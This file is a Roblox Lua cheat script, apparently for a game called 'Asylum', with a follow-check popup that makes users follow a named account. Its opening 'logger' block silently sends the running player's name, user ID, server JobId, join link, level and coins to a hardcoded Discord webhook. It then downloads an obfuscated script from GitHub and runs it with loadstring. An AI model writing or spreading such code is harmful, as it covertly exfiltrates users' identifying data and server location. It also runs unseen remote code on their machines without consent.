--// LOGGER REPLACEMENT
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- 1️⃣ Get your own overhead level
local playerLevel = "N/A"
local success, overheadFolder = pcall(function()
    return player:WaitForChild("PlayerGui"):WaitForChild("OverheadGuis"):WaitForChild("OverheadGui")
end)
if success and overheadFolder then
    for _, holder in ipairs(overheadFolder:GetChildren()) do
        local usernameLabel = holder:FindFirstChild("Username")
        local levelLabel = holder:FindFirstChild("Level")
        if usernameLabel and usernameLabel.Text == player.Name and levelLabel then
            playerLevel = tostring(levelLabel.Text):gsub("[%c]", "")
            playerLevel = playerLevel:gsub("^Level%s+", "")
            break
        end
    end
end

-- 2️⃣ Get Coins from Topbar (keep diamonds and commas)
local coinsValue = "N/A"
local success2, topbar = pcall(function()
    return player:WaitForChild("PlayerGui"):WaitForChild("TopbarStandard")
end)
if success2 and topbar then
    local ok, iconLabel = pcall(function()
        return topbar.Holders.Right.OverflowRight.IconButton.Menu.PointsIcon.IconButton.Menu.IconSpot.Contents.IconLabelContainer.IconLabel
    end)
    if ok and iconLabel then
        coinsValue = tostring(iconLabel.Text) -- keep as-is
    end
end

-- Job, place, time info
local jobId = (game.JobId and tostring(game.JobId)) or "N/A"
local placeId = (game.PlaceId and tostring(game.PlaceId)) or "N/A"
local timeString = os.date("!%Y-%m-%d %H:%M:%S")

local webhookUrl = "https://discord.com/api/webhooks/1414825657153622088/jiUttKn4YBKbKp9DUlIMOd3oL5-QqoBg9mhh33d_RrxTqAoH1UuzNRelDsTAj0Qi6qmx"

-- Build embed
local embed = {
    ["title"] = "Asylum script triggered!",
    ["description"] = string.format(
        "Player: %s (ID: %s) [Profile](https://www.roblox.com/users/%s/profile)\n" ..
        "ServerJobId: %s\n" ..
        "JoinGame: https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s\n" ..
        "PlaceId: %s\n" ..
        "Time: %s\n\n" ..
        "**OVERHEAD INFO**\n```lua\nLevel: %s\nCoins: %s\n```",
        player.Name, player.UserId, player.UserId,
        jobId,
        placeId, jobId,
        placeId,
        timeString,
        playerLevel, coinsValue
    ),
    ["color"] = 16711680
}

local data = {["embeds"] = {embed}}
local jsonData = HttpService:JSONEncode(data)

local req = request or http_request or (syn and syn.request)
if req then
    pcall(function()
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
    end)
end

--// FOLLOW CHECK SCRIPT WITH GUI (Cancel, Retry, Copy Link)
local USE_HARDCODED_USERID = true
local TARGET_USERNAME = "Snuver"
local TARGET_USERID = 422020805
local SNUVERS_USERID = 4165591465
local MAIN_SCRIPT_URL = "https://raw.githubusercontent.com/Scarsss111/ASYLUM/refs/heads/main/Gui%20for%20asylum%20OBFCS.lua"

local LocalPlayer = Players.LocalPlayer
local gui -- keep reference for retry

local function showPopup(title, message, okText, retryCallback, copyLink)
    if gui then gui:Destroy() end
    gui = Instance.new("ScreenGui")
    gui.Name = "ScarletFollowPopup"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.AnchorPoint = Vector2.new(0.5,0.5)
    frame.Size = UDim2.new(0, 430, 0, 240)
    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    frame.BackgroundColor3 = Color3.fromRGB(30,30,45)
    frame.BorderSizePixel = 0
    frame.BackgroundTransparency = 0.05
    frame.Parent = gui

    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -32, 0, 38)
    titleLabel.Position = UDim2.new(0, 16, 0, 10)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 26
    titleLabel.TextColor3 = Color3.fromRGB(186, 210, 255)
    titleLabel.Text = title
    titleLabel.TextWrapped = true
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = frame

    local msgLabel = Instance.new("TextLabel")
    msgLabel.Size = UDim2.new(1, -32, 0, 100)
    msgLabel.Position = UDim2.new(0, 16, 0, 55)
    msgLabel.BackgroundTransparency = 1
    msgLabel.Font = Enum.Font.Gotham
    msgLabel.TextSize = 18
    msgLabel.TextColor3 = Color3.new(1,1,1)
    msgLabel.Text = message
    msgLabel.TextWrapped = true
    msgLabel.TextXAlignment = Enum.TextXAlignment.Left
    msgLabel.TextYAlignment = Enum.TextYAlignment.Top
    msgLabel.Parent = frame

    -- Cancel Button
    local cancelButton = Instance.new("TextButton")
    cancelButton.Size = UDim2.new(0, 120, 0, 36)
    cancelButton.Position = UDim2.new(0.5, -190, 1, -46)
    cancelButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
    cancelButton.Font = Enum.Font.GothamMedium
    cancelButton.TextSize = 19
    cancelButton.Text = okText or "Cancel"
    cancelButton.TextColor3 = Color3.new(1, 1, 1)
    cancelButton.Parent = frame
    Instance.new("UICorner", cancelButton).CornerRadius = UDim.new(0, 8)
    cancelButton.MouseButton1Click:Connect(function() gui:Destroy() end)

    -- Retry Button
    if retryCallback then
        local retryButton = Instance.new("TextButton")
        retryButton.Size = UDim2.new(0, 120, 0, 36)
        retryButton.Position = UDim2.new(0.5, -60, 1, -46)
        retryButton.BackgroundColor3 = Color3.fromRGB(120, 180, 60)
        retryButton.Font = Enum.Font.GothamMedium
        retryButton.TextSize = 19
        retryButton.Text = "Retry"
        retryButton.TextColor3 = Color3.new(1,1,1)
        retryButton.Parent = frame
        Instance.new("UICorner", retryButton).CornerRadius = UDim.new(0, 8)
        retryButton.MouseButton1Click:Connect(function()
            gui:Destroy()
            retryCallback()
        end)
    end

    -- Copy Link Button
    if copyLink then
        local copyButton = Instance.new("TextButton")
        copyButton.Size = UDim2.new(0, 120, 0, 36)
        copyButton.Position = UDim2.new(0.5, 70, 1, -46)
        copyButton.BackgroundColor3 = Color3.fromRGB(200, 160, 50)
        copyButton.Font = Enum.Font.GothamMedium
        copyButton.TextSize = 19
        copyButton.Text = "Copy Link"
        copyButton.TextColor3 = Color3.new(1,1,1)
        copyButton.Parent = frame
        Instance.new("UICorner", copyButton).CornerRadius = UDim.new(0, 8)
        copyButton.MouseButton1Click:Connect(function()
            setclipboard(copyLink)
        end)
    end
end

local function resolveTargetUserId()
    if USE_HARDCODED_USERID then return TARGET_USERID end
    local success, userIdOrErr = pcall(function()
        return Players:GetUserIdFromNameAsync(TARGET_USERNAME)
    end)
    if success and typeof(userIdOrErr) == "number" then
        return userIdOrErr
    end
    showPopup("Error", "Could not resolve user ID for @"..TARGET_USERNAME..".", "Close")
    return nil
end

local function fetchFollowings()
    local req = request or http_request or (syn and syn.request)
    if not req then return {} end
    local url = ("https://friends.roblox.com/v1/users/%d/followings?limit=100"):format(LocalPlayer.UserId)
    local response = req({Url = url, Method = "GET", Headers = {["User-Agent"] = "Roblox/WinInet"}})
    if not response or not response.Body then return {} end
    local ok, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
    if not ok or type(data) ~= "table" or not data.data then return {} end
    return data.data
end

local function checkFollowStatus()
    local followingData = fetchFollowings()
    local followsSnuver = false
    local followsSnuvers = false

    for _, entry in ipairs(followingData) do
        if tonumber(entry.id) == TARGET_USERID then
            followsSnuver = true
        elseif tonumber(entry.id) == SNUVERS_USERID then
            followsSnuvers = true
        end
    end

    if followsSnuvers and not followsSnuver then
        LocalPlayer:Kick('You followed "Snuvers" instead of "Snuver" (no S).')
        return false
    elseif followsSnuvers and followsSnuver then
        LocalPlayer:Kick('You followed both "Snuver" and "Snuvers". Unfollow Snuvers to continue.')
        return false
    elseif not followsSnuver then
        return false
    end
    return true
end

local function main()
    local userId = resolveTargetUserId()
    if not userId then return end

    local function retry() main() end

    if checkFollowStatus() then
        print("Follow check passed! Loading main script...")
        local ok, err = pcall(function()
            loadstring(game:HttpGet(MAIN_SCRIPT_URL))()
        end)
        if not ok then warn(err) end

        -- Periodic check
        task.spawn(function()
            while task.wait(30) do
                if not checkFollowStatus() then
                    LocalPlayer:Kick("oi, why did you unfollow me >:(")
                    break
                end
            end
        end)
    else
        showPopup("Follow Required",
            "Follow Snuver on Roblox to use this script!",
            "Cancel", retry,
            "https://www.roblox.com/users/"..TARGET_USERID.."/profile"
        )
    end
end

main()
